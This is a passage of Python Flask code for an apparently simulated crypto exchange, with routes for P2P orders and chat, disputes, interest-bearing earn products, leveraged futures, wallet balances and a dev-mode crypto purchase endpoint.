        try: orders = [o for o in orders if o["amount_remaining"] >= float(min_amt)]
        except: pass
    if max_amt:
        try: orders = [o for o in orders if o["amount_remaining"] <= float(max_amt)]
        except: pass
    orders.sort(key=lambda x: x.get("completion_rate",0), reverse=True)
    return jsonify({"ok":True,"orders":orders})

@app.route("/api/p2p/create", methods=["POST"])
@login_required
def api_p2p_create():
    user  = session.get("user",{})
    store = ensure_user_store()
    p     = request.get_json() or {}
    sym   = (p.get("symbol") or "USDT").upper()
    side  = (p.get("side") or "sell").lower()
    try:
        price    = float(p.get("price") or 0)
        amount   = float(p.get("amount") or 0)
        min_ord  = float(p.get("min_order") or 10)
        max_ord  = float(p.get("max_order") or amount)
    except:
        return jsonify({"ok":False,"error":"Invalid numeric fields"}), 400
    if price <= 0 or amount <= 0:
        return jsonify({"ok":False,"error":"Price and amount must be > 0"}), 400
    methods = p.get("payment_methods") or ["Bank Transfer"]
    fiat    = (p.get("fiat") or "USD")
    # Reserve funds
    if side == "sell":
        if store["balances"].get(sym,0) + 1e-9 < amount:
            return jsonify({"ok":False,"error":f"Insufficient {sym}"}), 400
        store["balances"][sym] -= amount
    else:
        cost = amount * price
        if store["balances"].get("USDT",0) + 1e-9 < cost:
            return jsonify({"ok":False,"error":"Insufficient USDT"}), 400
        store["balances"]["USDT"] -= cost
    order = {
        "id": str(uuid.uuid4()), "maker_name": user.get("name","you"),
        "maker_email": user.get("email",""), "symbol": sym, "side": side,
        "price": price, "amount_total": amount, "amount_remaining": amount,
        "min_order": min_ord, "max_order": max_ord,
        "payment_methods": methods, "fiat": fiat, "region": p.get("region","Global"),
        "created_at": int(time.time()), "status": "open",
        "completion_rate": 100.0, "avg_release_mins": 15, "trades_count": 0,
        "session_id": current_session_id(),
    }
    p2p_store["orders"].append(order)
    p2p_store["chats"][order["id"]] = []
    return jsonify({"ok":True,"order":order})

@app.route("/api/p2p/take", methods=["POST"])
@login_required
def api_p2p_take():
    user  = session.get("user",{})
    store = ensure_user_store()
    p     = request.get_json() or {}
    oid   = p.get("order_id")
    try:   amount = float(p.get("amount") or 0)
    except: return jsonify({"ok":False,"error":"invalid amount"}), 400
    order = next((o for o in p2p_store["orders"] if o["id"] == oid), None)
    if not order: return jsonify({"ok":False,"error":"Order not found"}), 404
    if order["status"] != "open": return jsonify({"ok":False,"error":"Order not open"}), 400
    if amount < order["min_order"] or amount > order["max_order"]:
        return jsonify({"ok":False,"error":f"Amount must be {order['min_order']}–{order['max_order']}"}), 400
    if amount > order["amount_remaining"]:
        return jsonify({"ok":False,"error":"Exceeds available amount"}), 400
    sym  = order["symbol"]
    cost = amount * order["price"]
    # Taker buys crypto
    if order["side"] == "sell":  # maker is selling, taker is buying
        if store["balances"].get("USDT",0) + 1e-9 < cost:
            return jsonify({"ok":False,"error":"Insufficient USDT"}), 400
        store["balances"]["USDT"]     -= cost
        store["balances"][sym]         = store["balances"].get(sym,0) + amount
    else:  # maker is buying, taker is selling
        if store["balances"].get(sym,0) + 1e-9 < amount:
            return jsonify({"ok":False,"error":f"Insufficient {sym}"}), 400
        store["balances"][sym]        -= amount
        store["balances"]["USDT"]     += cost
    order["amount_remaining"] -= amount
    order["trades_count"]     += 1
    if order["amount_remaining"] <= 0:
        order["status"] = "completed"
    trade_id = str(uuid.uuid4())
    p2p_store["chats"].setdefault(oid, []).append({
        "id": trade_id, "sender": user.get("name","taker"),
        "msg": f"I've initiated a trade for {amount} {sym}. Please confirm payment.",
        "timestamp": int(time.time()), "is_system": True
    })
    return jsonify({"ok":True,"trade_id":trade_id,"order":order})

@app.route("/api/p2p/chat/<order_id>", methods=["GET","POST"])
@login_required
def api_p2p_chat(order_id):
    user = session.get("user",{})
    if request.method == "GET":
        msgs = p2p_store["chats"].get(order_id, [])
        return jsonify({"ok":True,"messages":msgs})
    p   = request.get_json() or {}
    msg = (p.get("message") or "").strip()
    if not msg: return jsonify({"ok":False,"error":"Empty message"}), 400
    entry = {"id": str(uuid.uuid4()), "sender": user.get("name","user"),
             "msg": msg, "timestamp": int(time.time()), "is_system": False}
    p2p_store["chats"].setdefault(order_id, []).append(entry)
    return jsonify({"ok":True,"message":entry})

@app.route("/api/p2p/dispute", methods=["POST"])
@login_required
def api_p2p_dispute():
    user = session.get("user",{})
    p    = request.get_json() or {}
    oid  = p.get("order_id")
    order= next((o for o in p2p_store["orders"] if o["id"] == oid), None)
    if not order: return jsonify({"ok":False,"error":"Order not found"}), 404
    dispute = {"id": str(uuid.uuid4()), "order_id": oid,
               "filed_by": user.get("name",""), "reason": p.get("reason",""),
               "status": "under_review", "created_at": int(time.time())}
    p2p_store["disputes"][oid] = dispute
    order["status"] = "disputed"
    return jsonify({"ok":True,"dispute":dispute})

# ── Earn ──
@app.route("/api/earn/products")
@login_required
def api_earn_products():
    type_filter = request.args.get("type","")
    prods = [p for p in EARN_PRODUCTS if not type_filter or p["type"] == type_filter]
    return jsonify({"ok":True,"products":prods})

@app.route("/api/earn/subscribe", methods=["POST"])
@login_required
def api_earn_subscribe():
    sid   = current_session_id()
    store = ensure_user_store()
    p     = request.get_json() or {}
    pid   = p.get("product_id","")
    prod  = next((x for x in EARN_PRODUCTS if x["id"] == pid), None)
    if not prod: return jsonify({"ok":False,"error":"Product not found"}), 404
    try:   amount = float(p.get("amount") or 0)
    except: return jsonify({"ok":False,"error":"Invalid amount"}), 400
    sym = prod["symbol"]
    if amount < prod["min_amount"]: return jsonify({"ok":False,"error":f"Min is {prod['min_amount']} {sym}"}), 400
    if amount > prod["max_amount"]: return jsonify({"ok":False,"error":f"Max is {prod['max_amount']} {sym}"}), 400
    if store["balances"].get(sym,0) + 1e-9 < amount:
        return jsonify({"ok":False,"error":f"Insufficient {sym}"}), 400
    store["balances"][sym] -= amount
    pos = {
        "id": str(uuid.uuid4()), "product_id": pid, "product_name": prod["name"],
        "symbol": sym, "amount": amount, "apy": prod["apy"],
        "type": prod["type"], "duration_days": prod.get("duration_days"),
        "subscribed_at": int(time.time()),
        "matures_at": int(time.time()) + prod["duration_days"]*86400 if prod.get("duration_days") else None,
        "accrued": 0.0, "status": "active"
    }
    earn_positions.setdefault(sid, []).append(pos)
    return jsonify({"ok":True,"position":pos})

@app.route("/api/earn/positions")
@login_required
def api_earn_positions():
    sid = current_session_id()
    positions = earn_positions.get(sid, [])
    # Accrue interest
    now = int(time.time())
    for pos in positions:
        if pos["status"] == "active":
            elapsed = (now - pos["subscribed_at"]) / (365 * 86400)
            pos["accrued"] = round(pos["amount"] * (pos["apy"]/100) * elapsed, 8)
    return jsonify({"ok":True,"positions":positions})

@app.route("/api/earn/redeem", methods=["POST"])
@login_required
def api_earn_redeem():
    sid   = current_session_id()
    store = ensure_user_store()
    p     = request.get_json() or {}
    pid   = p.get("position_id","")
    positions = earn_positions.get(sid, [])
    pos   = next((x for x in positions if x["id"] == pid), None)
    if not pos: return jsonify({"ok":False,"error":"Position not found"}), 404
    if pos["status"] != "active": return jsonify({"ok":False,"error":"Already redeemed"}), 400
    if pos.get("matures_at") and int(time.time()) < pos["matures_at"]:
        return jsonify({"ok":False,"error":"Fixed term not yet matured"}), 400
    now     = int(time.time())
    elapsed = (now - pos["subscribed_at"]) / (365 * 86400)
    interest= round(pos["amount"] * (pos["apy"]/100) * elapsed, 8)
    total   = pos["amount"] + interest
    store["balances"][pos["symbol"]] = store["balances"].get(pos["symbol"],0) + total
    pos["status"]    = "redeemed"
    pos["redeemed_at"] = now
    pos["final_interest"] = interest
    return jsonify({"ok":True,"returned": total, "interest": interest})

# ── Futures ──
@app.route("/api/futures/contracts")
@login_required
def api_futures_contracts():
    data = market_cache.get("data",{})
    result = []
    for sym, cfg in FUTURES_CONTRACTS.items():
        price = data.get(sym,{}).get("price",0)
        result.append({**cfg,"current_price":price,
                       "change_24h":data.get(sym,{}).get("change_24h",0)})
    return jsonify({"ok":True,"contracts":result})

@app.route("/api/futures/positions")
@login_required
def api_futures_positions():
    sid  = current_session_id()
    data = market_cache.get("data",{})
    positions = futures_positions.get(sid, [])
    # compute live PnL
    for pos in positions:
        if pos["status"] == "open":
            cur  = data.get(pos["symbol"],{}).get("price",pos["entry_price"])
            diff = (cur - pos["entry_price"]) * pos["quantity"]
            pos["unrealized_pnl"] = round(diff if pos["direction"] == "long" else -diff, 4)
            pos["current_price"]  = cur
            liq = pos["entry_price"] * (1 - 1/pos["leverage"]) if pos["direction"] == "long" \
                  else pos["entry_price"] * (1 + 1/pos["leverage"])
            pos["liquidation_price"] = round(liq, 6)
    return jsonify({"ok":True,"positions":positions})

@app.route("/api/futures/open", methods=["POST"])
@login_required
def api_futures_open():
    sid   = current_session_id()
    store = ensure_user_store()
    p     = request.get_json() or {}
    sym   = (p.get("symbol") or "").upper()
    if sym not in FUTURES_CONTRACTS: return jsonify({"ok":False,"error":"Unknown contract"}), 400
    direction = (p.get("direction") or "").lower()
    if direction not in ("long","short"): return jsonify({"ok":False,"error":"direction must be long/short"}), 400
    try:
        qty      = float(p.get("quantity") or 0)
        leverage = int(p.get("leverage") or 1)
    except: return jsonify({"ok":False,"error":"Invalid numeric fields"}), 400
    cfg = FUTURES_CONTRACTS[sym]
    if leverage < cfg["min_leverage"] or leverage > cfg["max_leverage"]:
        return jsonify({"ok":False,"error":f"Leverage must be {cfg['min_leverage']}–{cfg['max_leverage']}x"}), 400
    price = market_cache["data"].get(sym,{}).get("price")
    if not price: return jsonify({"ok":False,"error":"Price unavailable"}), 400
    notional = qty * price
    margin   = notional / leverage
    fee      = notional * cfg["taker_fee"]
    total    = margin + fee
    if store["balances"].get("USDT",0) + 1e-9 < total:
        return jsonify({"ok":False,"error":"Insufficient USDT margin"}), 400
    store["balances"]["USDT"] -= total
    pos = {
        "id": str(uuid.uuid4()), "symbol": sym, "direction": direction,
        "quantity": qty, "leverage": leverage, "entry_price": price,
        "notional": notional, "margin": margin, "fee": fee,
        "unrealized_pnl": 0.0, "current_price": price,
        "liquidation_price": round(price*(1-1/leverage) if direction=="long" else price*(1+1/leverage),6),
        "status": "open", "opened_at": int(time.time()),
    }
    futures_positions.setdefault(sid, []).append(pos)
    return jsonify({"ok":True,"position":pos})

@app.route("/api/futures/close", methods=["POST"])
@login_required
def api_futures_close():
    sid   = current_session_id()
    store = ensure_user_store()
    p     = request.get_json() or {}
    pid   = p.get("position_id","")
    positions = futures_positions.get(sid, [])
    pos   = next((x for x in positions if x["id"] == pid), None)
    if not pos: return jsonify({"ok":False,"error":"Position not found"}), 404
    if pos["status"] != "open": return jsonify({"ok":False,"error":"Already closed"}), 400
    price_now = market_cache["data"].get(pos["symbol"],{}).get("price", pos["entry_price"])
    diff  = (price_now - pos["entry_price"]) * pos["quantity"]
    pnl   = diff if pos["direction"] == "long" else -diff
    returned = pos["margin"] + pnl
    if returned > 0:
        store["balances"]["USDT"] = store["balances"].get("USDT",0) + returned
    pos.update({"status":"closed","close_price":price_now,
                "realized_pnl":round(pnl,4),"closed_at":int(time.time())})
    return jsonify({"ok":True,"realized_pnl":round(pnl,4),"returned":max(0,returned)})

# ── Wallet ──
@app.route("/api/wallet/balances")
@login_required
def api_wallet_balances():
    store = ensure_user_store()
    data  = market_cache.get("data",{})
    result= []
    for sym, bal in store["balances"].items():
        if bal <= 0 and sym != "USDT": continue
        price = data.get(sym,{}).get("price",1.0) if sym != "USDT" else 1.0
        result.append({
            "symbol": sym, "name": data.get(sym,{}).get("name",sym),
            "balance": bal, "usd_value": round(bal * price, 4),
            "price": price,
            "image": data.get(sym,{}).get("image",""),
            "isMock": data.get(sym,{}).get("isMock",False),
        })
    result.sort(key=lambda x: x["usd_value"], reverse=True)
    return jsonify({"ok":True,"balances":result,
                    "total_usd": sum(r["usd_value"] for r in result)})

@app.route("/api/wallet/history")
@login_required
def api_wallet_history():
    store  = ensure_user_store()
    orders = store.get("orders",[])
    trades = store.get("trades",[])
    txns   = store.get("transfers",[])
    history= []
    for t in trades:
        history.append({"type":"trade","symbol":t["symbol"],"side":t["side"],
            "amount":t["quantity"],"price":t["price"],"timestamp":t["timestamp"]})
    for tx in txns:
        history.append({"type":"withdraw","symbol":"USDT","side":"out",
            "amount":tx["amount"],"address":tx["to"],"network":tx["network"],
            "status":tx["status"],"timestamp":tx["timestamp"]})
    history.sort(key=lambda x: x["timestamp"], reverse=True)
    return jsonify({"ok":True,"history":history[:100]})

# ── Buy Crypto ──
@app.route("/api/buy_crypto/quote", methods=["POST"])
@login_required
def api_buy_crypto_quote():
    p      = request.get_json() or {}
    sym    = (p.get("symbol") or "BTC").upper()
    fiat_amt = float(p.get("fiat_amount") or 100)
    method = (p.get("method") or "card")
    price  = market_cache["data"].get(sym,{}).get("price",1.0)
    fee_pct= 0.035 if method == "card" else 0.012
    fee    = round(fiat_amt * fee_pct, 2)
    net    = fiat_amt - fee
    qty    = net / price if price > 0 else 0
    return jsonify({"ok":True,"symbol":sym,"fiat_amount":fiat_amt,"fee":fee,
                    "crypto_amount":round(qty,8),"rate":price,"method":method})

@app.route("/api/buy_crypto/execute", methods=["POST"])
@login_required
def api_buy_crypto_execute():
    sid   = current_session_id()
    store = ensure_user_store()
    p     = request.get_json() or {}
    sym   = (p.get("symbol") or "BTC").upper()
    try:   fiat_amt = float(p.get("fiat_amount") or 0)
    except: return jsonify({"ok":False,"error":"invalid amount"}), 400
    method = (p.get("method") or "card")
    price  = market_cache["data"].get(sym,{}).get("price",1.0)
    fee_pct= 0.035 if method == "card" else 0.012
    fee    = fiat_amt * fee_pct
    net    = fiat_amt - fee
    qty    = net / price if price > 0 else 0
    if qty <= 0: return jsonify({"ok":False,"error":"Invalid amount"}), 400
    # Simulate: credit crypto to wallet (in dev mode, USDT "purchased" is credited)
    store["balances"][sym] = store["balances"].get(sym,0) + qty
    store["trades"].append({
        "id": str(uuid.uuid4()), "symbol": sym, "side": "buy",
        "price": price, "quantity": qty, "timestamp": int(time.time()),
        "from_limit": False, "source": "buy_crypto",
    })
    return jsonify({"ok":True,"symbol":sym,"qty":round(qty,8),
                    "fee":round(fee,2),"rate":price})

# ═══════════════════════════════════════════════════════════════════════════════
# Entry point
# ═══════════════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    fetch_prices_once()
    _seed_p2p()
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)